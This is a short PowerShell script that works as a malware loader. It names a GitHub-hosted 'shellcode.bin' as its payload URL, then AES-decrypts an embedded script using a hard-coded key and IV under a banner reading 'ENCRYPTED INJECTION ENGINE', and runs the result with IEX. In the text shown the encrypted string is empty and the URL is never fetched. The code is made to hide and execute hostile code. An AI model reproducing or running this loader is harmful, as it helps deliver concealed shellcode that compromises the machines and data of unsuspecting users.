$global:payloadUrl = "https://github.com/grere856-lgtm/reimagined-bassoon/raw/refs/heads/main/shellcode.bin"

# ==========================================
# ENCRYPTED INJECTION ENGINE (DO NOT TOUCH)
# ==========================================
$enc = ""
$key = [System.Text.Encoding]::UTF8.GetBytes("PhantomKey1234567890123456789012")
$iv = [System.Text.Encoding]::UTF8.GetBytes("1234567890123456")

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV = $iv
$decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)

$ms = New-Object System.IO.MemoryStream(,[Convert]::FromBase64String($enc))
$cs = New-Object System.Security.Cryptography.CryptoStream($ms, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)
$sr = New-Object System.IO.StreamReader($cs)
$decryptedScript = $sr.ReadToEnd()
$sr.Close()
$cs.Close()
$ms.Close()

IEX $decryptedScript
